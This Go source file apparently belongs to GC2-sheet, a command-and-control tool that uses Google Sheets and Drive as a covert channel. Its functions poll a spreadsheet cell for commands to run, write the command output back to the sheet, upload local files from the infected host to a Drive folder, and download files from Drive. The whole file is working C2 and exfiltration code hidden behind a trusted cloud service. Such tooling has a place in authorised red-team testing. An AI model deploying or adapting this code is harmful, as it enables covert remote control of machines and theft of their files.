package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"

	"google.golang.org/api/drive/v3"
	"google.golang.org/api/sheets/v4"
)

func (g *Google) pullFile(fileId string) ([]byte, error) {

	resp, err := g.clientDrive.Files.Get(fileId).Download()
	if err != nil {
		return nil, err
	}

	defer resp.Body.Close()

	fileDownloaded, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return fileDownloaded, nil
}

func (g *Google) pullCommandAndTicker() (string, int) {

	var commandResult string
	var tickerDelayResult int

	spreadsheetId := g.spreadSheet.SpreadSheetId

	sheetName := g.spreadSheet.CommandSheet.Name

	rangeCell := g.getLastCommand().RangeIn
	rangeId := strconv.Itoa(g.getLastCommand().RangeId)
	// Example: Sheet1!A2
	readRange := fmt.Sprintf("%s!%s%s", sheetName, rangeCell, rangeId)

	resp, err := g.clientSheet.Spreadsheets.Values.Get(spreadsheetId, readRange).Do()
	if err != nil {
		utils.LogDebug("Unable to retrieve data from sheet: " + err.Error())
		commandResult = ""
	}

	// Provide debug information for issue #5
	if resp == nil {
		utils.LogFatalDebug("Cannot read Sheet ID, verify if API has been enabled for service account: " + err.Error())
	}

	if len(resp.Values) == 0 {
		commandResult = ""
	} else {
		// Get result
		row := resp.Values[0]
		commandResult = fmt.Sprintf("%v", row[0])
	}

	readRange = fmt.Sprintf("%s!%s", sheetName, g.spreadSheet.CommandSheet.RangeTickerConfiguration)
	resp, err = g.clientSheet.Spreadsheets.Values.Get(spreadsheetId, readRange).Do()
	if err != nil {
		utils.LogDebug("Unable to retrieve data from sheet: " + err.Error())
		tickerDelayResult = 0
	}

	if len(resp.Values) == 0 {
		tickerDelayResult = 0
	} else {
		// Get result
		row := resp.Values[0]
		tickerDelayResultString := fmt.Sprintf("%v", row[0])
		tickerDelayResult, err = strconv.Atoi(tickerDelayResultString)
		if err != nil {
			tickerDelayResult = 0
		}
	}

	return commandResult, tickerDelayResult
}

func (g *Google) pushFile(localFilePath string) error {

	var parent []string
	driveFolderId := g.spreadSheet.DriveId
	parent = append(parent, driveFolderId)

	fileName := filepath.Base(localFilePath)

	f := &drive.File{
		Name:    fileName,
		DriveId: driveFolderId,
		Parents: parent,
	}

	file, _ := os.Open(localFilePath)

	_, err := g.clientDrive.Files.Create(f).Media(file).Do()

	return err

}

func (g *Google) pushOutput(lastCommand *configuration.Commands) {

	sheetName := g.spreadSheet.CommandSheet.Name
	rangeOut := lastCommand.RangeOut
	rangeLog := lastCommand.RangeLog
	rangeId := strconv.Itoa(lastCommand.RangeId)
	// Example: Sheet1!A2

	range2 := fmt.Sprintf("%s!%s%s:%s%s", sheetName, rangeOut, rangeId, rangeLog, rangeId)

	outputCommand := lastCommand.Output
	var output [][]interface{}
	output = append(output, make([]interface{}, 2))

	output[0][0] = outputCommand
	output[0][1] = utils.GetCurrentDate()

	valueRange := &sheets.ValueRange{
		Range:  range2,
		Values: output,
	}

	valueInputOption := "RAW"

	_, err := g.clientSheet.Spreadsheets.Values.Update(g.spreadSheet.SpreadSheetId, range2, valueRange).ValueInputOption(valueInputOption).Do()

	if err != nil {
		utils.LogDebug("[-] Cannot write on remote sheet: " + err.Error())
	}

}

func (g *Google) addCommandToPool(command *configuration.Commands) {
	// Add command to pool
	g.spreadSheet.CommandSheet.CommandsExecution = append(g.spreadSheet.CommandSheet.CommandsExecution, command)
}

// get last command form the command list
func (g *Google) getLastCommand() *configuration.Commands {

	spreadSheet := g.spreadSheet

	if len(spreadSheet.CommandSheet.CommandsExecution) == 0 {
		return nil
	}

	return spreadSheet.CommandSheet.CommandsExecution[len(spreadSheet.CommandSheet.CommandsExecution)-1]

}
